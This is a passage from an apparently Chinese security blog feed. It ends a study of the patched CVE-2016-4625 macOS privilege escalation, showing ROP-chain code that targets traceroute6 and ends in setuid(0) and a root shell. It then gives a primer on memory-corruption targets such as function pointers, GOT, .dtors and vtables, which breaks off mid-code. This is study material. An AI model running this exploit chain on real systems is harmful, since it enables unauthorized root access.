class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</div><div class="line">    args_u64[i] = ret;</div><div class="line">  &#125;</div><div class="line">【<span class="number">0</span>】 提权的 shellcode</div><div class="line">  args_u64[i] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">  args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</div><div class="line">  args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">4</span>] = bin_sh;</div><div class="line">  args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</div><div class="line"></div><div class="line">  <span class="comment">// allocate worst-case size</span></div><div class="line">   <span class="comment">// malloc 足够大的空间来保存 shellcode </span></div><div class="line">  <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</div><div class="line">  <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</div><div class="line">  <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</div><div class="line"><span class="comment">// 【1】 设置启动参数 /usr/sbin/traceroute6 -w  LOLLLL</span></div><div class="line">  target_argv[<span class="number">0</span>] = progname;</div><div class="line">  target_argv[<span class="number">1</span>] = optname;</div><div class="line">  target_argv[<span class="number">2</span>] = optval;</div><div class="line">  <span class="keyword">int</span> argn = <span class="number">3</span>;</div><div class="line"></div><div class="line">  <span class="comment">//【2】将 ret 数组的地址写入到 argv 中</span></div><div class="line">  target_argv[argn++] = &amp;args[<span class="number">0</span>];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    <span class="keyword">if</span> (args[i<span class="number">-1</span>] == <span class="number">0</span>) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  target_argv[argn] = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> target_argv;</div></pre></td></tr></table></figure>
<p>【1】设置 traceroute6 的错误参数<br>【1】处的参数执行完以后给 parent 足够的时间来将 目标进程中 DATA段中__cleanup 函数指针覆盖为 一段gadget 的地址（此时shellcode 的地址还不能确定）, 就是步骤<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a>中找到的 gadget 的地址。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp        </div><div class="line">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</div><div class="line">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</div><div class="line">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</div><div class="line">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</div><div class="line">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</div><div class="line">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</div><div class="line">// 0x7fffa333ab58 &lt;+1925&gt;: retq</div></pre></td></tr></table></figure></p>
<p>这里 作者预测了tracerouter6 的栈帧长度是 0x948，</p>
<p>【2】处将 ret slide 拷贝到 argv s 参数列表。<br>在调试的过程中发现 x86-64位机器系统库加载的地址从0x00007fff000000000开始偏移小余4G，所以所有 gadget 指令地址都包含2个NULL字节，因为argvs 默认以 NULL 字符结尾所以第二个 NULL 会被认为没有参数了，这样就无法在栈上喷射大量的 ret指令。这里通过使用2个参数指针来指向一个 ret 地址的方法来解决这个问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">target_argv[argn++] = &amp;args[0];</div><div class="line">  for(int i = 1; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    if (args[i-1] == 0) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>这段代码实现了将 shellcode 内存地址 传递给 argv 指针，同时为了防止出现连续2个 null 字节的情况，将2个连续的 null字节（第二个）保存到了2个 argv 指针中。<br>说明：这段实现要提前检查 ret 地址中 null 字节的个数，null 字节不能超过2个否则 ret地址会被截断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int count_nulls(uint64_t val) &#123;</div><div class="line">  int nulls = 0;</div><div class="line">  uint8_t* bytes = (uint8_t*)&amp;val;</div><div class="line">  for (int i = 0; i &lt; 8; i++)&#123;</div><div class="line">    if (bytes[i] == 0) &#123;</div><div class="line">      nulls++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return nulls;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>【0】这里是提权的 shellcode， 先将自生uid 设置成 root 用户，然后开启一个终端这个终端默认是 root 用户并且不能自动降低权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">setuid(0);  //将当前进程设置为 root</div><div class="line">    pop rdi   ; 参数 为0</div><div class="line">    ret       ; setuid</div><div class="line"></div><div class="line">system(“/bin/csh”);</div><div class="line">    pop rdi   ; 参数 为’/bin/csh’</div><div class="line">    ret       ; system</div></pre></td></tr></table></figure></p>
<p>最后来张图看下内存布局<br><img src="/include/img/4625/gadget_shellcode.jpg" alt="gadget_shellcode"></p>
<h4 id="漏洞补丁："><a href="#漏洞补丁：" class="headerlink" title="漏洞补丁："></a>漏洞补丁：</h4><p>OS X El Capitan v10.11.6 and Security Update 2016-004 </p>
<h3 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h3><p>  本文还有一些内容没有介绍，其中一些我也不清楚有些只知道皮毛。列举几个问题和待完善的地方：</p>
<ul>
<li>IOSurfaceRootUserClient 创建共享内存原语的2个函数，应该逆向分析下原理帮助定位 shellcode，同时 port IPC通信也需要分析。</li>
<li>代码中计算ret_slide_length 时候为什么要除5？</li>
<li>分析完整个 exploit 再回看漏洞本身，感觉提权的部分和漏洞的关系貌似不大；如果我在第一个创建的子进程中启动 traceroute6（先进行 port dancer 传递 child task port）,是否父进程也可以共享 tracerouter6的内存空间，如果可以后面的工作就是一样的了应该也可以提权。 这个想法有待尝试，但是失败的可能性是80% 猜测可能有权限的限制（比如系统检测到 tracerrouter6是 root用户的进程不允许普通用户共享内存）。</li>
<li>还有就是资料中用 IDA反编译 IOSurface.text 时怎么获取的结构体信息，这个模块是没有源代码的，有什么逆向的技巧吗？</li>
</ul>
<h4 id="CVE-2016-4625-的前途："><a href="#CVE-2016-4625-的前途：" class="headerlink" title="CVE-2016-4625 的前途："></a>CVE-2016-4625 的前途：</h4><p>由于除了root以外，这个bug也允许我们获得其他任何权限，所以很容易利用它来绕过OS X上的内核代码签名，并加载一个未签名的内核扩展<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试机：Mac Mini<br>系统版本：OS X EI capitan 10.11.2</p>
<p><img src="/include/img/4625/test.jpg" alt="test"></p>
<h3 id="snippet"><a href="#snippet" class="headerlink" title="snippet"></a>snippet</h3><p>…</p>
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-03-06</td>
<td>debug exp</td>
</tr>
<tr>
<td>2017-03-07</td>
<td>write blogs</td>
</tr>
</tbody>
</table>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://bbs.pediy.com/thread-215839.htm" target="_blank" rel="external">译文</a><br><a href="https://googleprojectzero.blogspot.kr/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">原文</a><br><a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">CVE-2016-1757的Exploit — Patching kextload</a><br><a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">再看CVE-2016-1757浅析mach%20message的使用</a><br><a href="http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/" target="_blank" rel="external">调试 CVE-2016-4625 exploit </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;(本人第一次接触 OSX 系统，这篇文章对我来说难度还是比较大的，本人水平有限文章难免有错，请路过的大牛多多指点，轻拍)&lt;/p&gt;
&lt;p&gt;本文是为分析 yalu102越狱工具做铺垫，这个漏洞并没有在 yalu越狱中被使用，因为这个漏洞是 macOS 中的。&lt;br&gt;分析本文是为了学习 XNU 中 task 结构体存在的分险并且结合 port 来实现提权的原理。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
      <category term="ios/osx" scheme="http://yoursite.com/tags/ios-osx/"/>
    
  </entry>
  
  <entry>
    <title>漏洞基础--内存漏洞</title>
    <link href="http://yoursite.com/2017/02/28/%E5%86%85%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/02/28/内存漏洞/</id>
    <published>2017-02-28T05:07:08.000Z</published>
    <updated>2017-03-09T16:31:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>《C++ 安全编程》 – 第 三 章：指针诡计<br><a id="more"></a></p>
</blockquote>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>本章介绍内存漏洞，如何达到 劫持控制流 和 任意内存地址写。<br>两个典型的例子：</p>
<ul>
<li>覆盖函数指针：通过溢出操作，覆盖内存中的函数指针指向攻击者的 shellcode，达到劫持控制流的目的。如果是内核中劫持控制流应为有 PXN 的限制不能直接从内核跳转到用户态执行，所以需要 ROP 或者其他手段配合使用。（绕过 PXN 不属于本文介绍内容）</li>
<li>修改指针对象：如果一个指针对象作为后继赋值操作的目的地址，那么攻击者就可以通过控制指针对象达到任意地址写。</li>
</ul>
<p>学习这部分内容，前置的知识是要 知道程序中的数据，指令在内存中的位置，所处的环境（内核、用户态）。</p>
<p>数据包括：局部变量、参数、返回值、函数指针、全局变量、静态变量、类对象、类的成员、类的虚表 等等。<br>指令包括：用户代码、动态库、静态库、中断代码、系统调用、驱动+内核代码</p>
<p>列表：</p>
<ol>
<li>函数指针</li>
<li>对象指针</li>
<li>修改指令指针</li>
<li>全局偏移表 GOT</li>
<li>.dtors 区</li>
<li>虚指针</li>
<li>longjmp 函数</li>
</ol>
<h3 id="函数指针安全-–-缓冲区溢出-控制流"><a href="#函数指针安全-–-缓冲区溢出-控制流" class="headerlink" title="函数指针安全 – 缓冲区溢出/控制流"></a>函数指针安全 – 缓冲区溢出/控制流</h3><blockquote>
<p>3.2 函数指针</p>
</blockquote>
<h4 id="Case"><a href="#Case" class="headerlink" title="Case"></a>Case</h4><p>BSS段中的缓冲区溢出<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">good_function</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;...&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buff[BUFFERSIZE];</div><div class="line">    <span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>;</div><div class="line">    funcPtr = &amp;good_function;</div><div class="line">    srncpy(buff, argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>]));   <span class="comment">// 有可能覆盖 funcPtr</span></div><div class="line">    (<span class="keyword">void</span>)(*funcPtr)(argv[<span class="number">2</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="对象指针-–-任意地址写-控制流"><a href="#对象指针-–-任意地址写-控制流" class="headerlink" title="对象指针 – 任意地址写/控制流"></a>对象指针 – 任意地址写/控制流</h3><blockquote>
<p>3.3</p>
</blockquote>
<p>任意地址写任意数据<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">void</span> * arg, <span class="keyword">size_t</span> len)</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">100</span>];</div><div class="line">    <span class="keyword">long</span> val = ..;</div><div class="line">    <span class="keyword">long</span> * ptr = ...;</div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(buff, arg, len);</div><div class="line">    *ptr = val;</div><div class="line">    ..</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注意：类型长度， x86-32位系统中 void* ，int， long都是 4字节</p>
<h3 id="修改指令指针"><a href="#修改指令指针" class="headerlink" title="修改指令指针"></a>修改指令指针</h3><p>x86-32 架构，指令指针寄存器 eip，不可以直接修改。必须通过控制转移指令（jmp, jcc, call 和 ret等），中断，异常 间接修改。<br>(貌似 arm 上可以直接修改??)</p>
<p>分析 call 指令：</p>
<ol>
<li>将返回值存储到栈中</li>
<li>将控制权转到目标操作数 （立即数，通用寄存器，内存地址）</li>
</ol>
<h4 id="Case-1"><a href="#Case-1" class="headerlink" title="Case"></a>Case</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">good_function</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, str);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span></span>;</div><div class="line">    funcPtr = &amp;good_function;</div><div class="line">    (<span class="keyword">void</span>)(*funcPtr)(<span class="string">"hi \n"</span>);      【<span class="number">1</span>】</div><div class="line">    good_function(<span class="string">"there!\n"</span>);      【<span class="number">2</span>】</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">x86 汇编</div><div class="line">_main   PROC</div><div class="line">        push     ebp</div><div class="line">        mov      ebp, esp</div><div class="line">        mov      DWORD PTR good_function OFFSET ?good_function@@YAXPBD@Z</div><div class="line">        <span class="comment">//[1]</span></div><div class="line">        push     OFFSET $SG5338</div><div class="line">        call     DWORD PTR ?funcPtr@?<span class="number">1</span>??main@@<span class="number">9</span>@<span class="number">4</span>P6AXPBD@ZA</div><div class="line">        add      esp, <span class="number">4</span></div><div class="line"></div><div class="line">        <span class="comment">//[2]</span></div><div class="line">        push     OFFSET $SG5339</div><div class="line">        call     good_function</div><div class="line">        add      esp, <span class="number">4</span></div><div class="line">        xor      eax, eax</div><div class="line">        pop      ebp</div><div class="line">        ret      <span class="number">0</span></div><div class="line">_main   ENDP</div><div class="line"></div><div class="line">good_function PROC</div><div class="line">        push     ebp</div><div class="line">        mov      ebp, esp</div><div class="line">        mov      eax, DWORD PTR _str$[ebp]</div><div class="line">        push     eax</div><div class="line">        push     OFFSET $SG5329</div><div class="line">        call     _printf</div><div class="line">        add      esp, <span class="number">8</span></div><div class="line">        pop      ebp</div><div class="line">        ret      <span class="number">0</span></div><div class="line">good_function ENDP</div></pre></td></tr></table></figure>
<h3 id="全局偏移表-GOT-–-任意地址写-控制流"><a href="#全局偏移表-GOT-–-任意地址写-控制流" class="headerlink" title="全局偏移表 GOT – 任意地址写/控制流"></a>全局偏移表 GOT – 任意地址写/控制流</h3><p>任何 ELF 的二进制文件的进程空间中，都包含一个GOT 表。GOT 存放绝对地址，地址是有效的并且不影响 PIC/PIE。改变的内容和形式取决于处理器型号。</p>
<p>程序首次使用一个外部模块的函数之前，先要跳入 plt中调用 _dl_runtime_resolve 函数完成符号解析和重定位，将函数的绝对地址写入对应的 GOT 表项。再次执行次函数时，就从 GOT 表中执行绝对地址。</p>
<p>在函数中调用重定位函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">blx    func   ; 套转到 func@plt 中</div><div class="line">...</div><div class="line"></div><div class="line">PTL0:</div><div class="line">    push *(GOT+4) //保存的是当前模块的ID</div><div class="line">    jump *(GOT+8) //跳转到 _dl_runtime_resolve()完成符号解析和重定位</div><div class="line">......</div><div class="line">func@plt:</div><div class="line">    jmp *(func@GOT)     // 第一次 GOT 表项会跳转到下移行执行</div><div class="line">    push n      //对应 GOT 表中 func 函数的索引</div><div class="line">    jmp PLT0</div></pre></td></tr></table></figure></p>
<p>攻击者可以利用，任意地址写漏洞覆盖 GOT 表中的函数地址为 shellcode 地址。<br>这一类攻击主要在用户态被使用。<br>一般C 程序最后都会调用 exit()函数，所以我们经常覆盖 exit 的 GOT 入口项。</p>
<h4 id="Case-2"><a href="#Case-2" class="headerlink" title="Case"></a>Case</h4><h3 id="dtors-区-–-任意地址写-控制流"><a href="#dtors-区-–-任意地址写-控制流" class="headerlink" title=".dtors 区  – 任意地址写/控制流"></a>.dtors 区  – 任意地址写/控制流</h3><p>任意内存写覆盖 GCC 生成的可执行文件中.dtors 区中函数指针。</p>
<p>GNU C 允许程序员利用<strong>attribute</strong>关键字给函数添加属性。属性包括constructor和 destructor。<br>constructor 在 main之前执行，在.ctors 区中。<br>destructor 在 exit之后执行，在 dtors 区中。<br>因为 constructor中的函数在 main 前执行完一次就不再执行，所以漏洞利用只考虑覆盖 destructor 中的函数指针。</p>
<p>.dtors 区是可写的（不可写可以用 mprotect函数修改 prot）。其内容的格式：<br>0xffff ffff {函数地址1，函数地址2.、、} 0x0000 0x0000</p>
<p>如果没有执行析构函数，.dtors 区中中包含头、尾标签而中间没有函数地址，一样可以将尾（0x0000 0000）覆盖为 shellcode 的地址。</p>
<p><a href="http://blog.csdn.net/pillarbuaa/article/details/7800801" target="_blank" rel="external">通过覆盖.dtors进行缓冲区溢出攻击</a></p>
<h4 id="Case-3"><a href="#Case-3" class="headerlink" title="Case"></a>Case</h4><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">static void create(void) __attribute__ ((constructor));</div><div class="line">static void destroy(void) __attribute__ ((destructor));</div><div class="line"></div><div class="line">int main(int argc, char const *argv[])</div><div class="line">&#123;</div><div class="line">    printf("create fptr: %p. \n", create);</div><div class="line">    printf("destroy fptr: %p. \n", destroy);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void create(void) &#123;</div><div class="line">    puts("create called.");</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void destroy(void) &#123;</div><div class="line">    puts("destroy called.");</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="虚指针"><a href="#虚指针" class="headerlink" title="虚指针"></a>虚指针</h3><p>虚函数：用 virtual 定义的类成员函数。该函数可以被子类同名函数重写。 子类对象的指针可以被赋值给基类指针，使用该基类指针可以调用函数。</p>
<ol>
<li>调用非虚函数， 则调用的是基类的函数，因为和指针的静态类型相关联。</li>
<li>调用虚函数，则是子类的函数，和动态类型相关联</li>
</ol>
<h4 id="Case-4"><a href="#Case-4" class="headerlink" title="Case"></a>Case</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> a &#123;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"base f"</span> &lt;&lt; <span class="string">'\n'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"base g"</span> &lt;&lt; <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;  <span class="comment">// end a</span></div><div class="line"></div><div class="line"><span class="keyword">class</span> b &#123;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"subclass f"</span> &lt;&lt; <span class="string">'\n'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"subclass g"</span> &lt;&lt; <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    a *my_b =  <span class="keyword">new</span> b();</div><div class="line">    my_b-&gt;f();</div><div class="line">    mt_b-&gt;g();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>任意地址写覆盖 虚表中的 g 函数地址，劫持控制流。虚表在 bss 段。</p>
<h3 id="atexit-和-on-exit-函数"><a href="#atexit-和-on-exit-函数" class="headerlink" title="atexit() 和 on_exit() 函数"></a>atexit() 和 on_exit() 函数</h3><p>atexit() 是C 标准定义的一个通用工具函数。atexit 可以注册无参函数，在程序正常接受后调用该函数。</p>
<h4 id="Case-5"><a href="#Case-5" class="headerlink" title="Case"></a>Case</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *glob;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, glob);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    atexit(test);</div><div class="line">    glob = <span class="string">"Exiting. \n"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过调试 可以知道其调用流程，然后分析源码：<br>Linux:<br><code>_start -&gt; __libc_start_main -&gt; __GI_exit -&gt; __run_exit_handlers</code></p>
<p>OSX :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">thread #1: tid = 0x264c8, 0x0000000100000f10 at`test, queue = &apos;com.apple.main-thread&apos;, stop reason = breakpoint 1.1</div><div class="line"> * frame #0: 0x0000000100000f10 at`test</div><div class="line">   frame #1: 0x00007fffbcbaf17f libsystem_c.dylib`__cxa_finalize_ranges + 339</div><div class="line">   frame #2: 0x00007fffbcbaf4b2 libsystem_c.dylib`exit + 55</div><div class="line">   frame #3: 0x00007fffbcb1a25c libdyld.dylib`start + 8</div></pre></td></tr></table></figure></p>
<p>现在 还没有找到 文章中说的 __exit_funcs 函数， linux 中有，但是 mac 上没有。</p>
<p><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.h.html</a><br><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers</a><br><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list</a></p>
<p>使用 gdb 调试：<br>p  initial   打印出 全局变量 initial 的内存结构 （ struct exit_function_list ）<br>注意：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">xa_atexit.c</div><div class="line"><span class="keyword">static</span> <span class="keyword">struct</span> exit_function_list initial;</div><div class="line"><span class="keyword">struct</span> exit_function_list *__exit_funcs = &amp;initial;</div><div class="line">--------------</div><div class="line"><span class="built_in">exit</span>.c</div><div class="line"><span class="keyword">void</span></div><div class="line"><span 